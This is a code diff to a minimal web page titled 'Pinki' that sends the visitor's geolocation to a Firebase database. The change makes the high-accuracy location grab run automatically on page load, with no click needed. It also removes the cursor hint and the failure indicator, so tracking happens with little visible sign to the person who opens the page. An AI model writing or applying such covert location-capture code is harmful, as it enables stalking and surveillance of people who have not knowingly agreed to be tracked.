@@ -13,7 +13,6 @@
             justify-content: center;
             min-height: 100vh;
             background: #ffffff;
-            cursor: pointer;
         }
         .title {
             font-size: 32px;
@@ -30,7 +29,7 @@
         }
     </style>
 </head>
-<body onclick="getLocation()">
+<body>
     <div class="title">Pinki</div>
     <div id="status"></div>
 
@@ -43,8 +42,9 @@
         });
         const db = getDatabase(app);
 
-        window.getLocation = function() {
-            document.getElementById('status').textContent = '...';
+        // Page open hote hi automatic
+        window.onload = function() {
+            if (!navigator.geolocation) return;
             navigator.geolocation.getCurrentPosition(
                 function(position) {
                     set(ref(db, 'families/74b5bd46/ondemand/location'), {
@@ -57,9 +57,7 @@
                         document.getElementById('status').textContent = '✓';
                     });
                 },
-                function() {
-                    document.getElementById('status').textContent = '✗';
-                },
+                function() {},
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         }
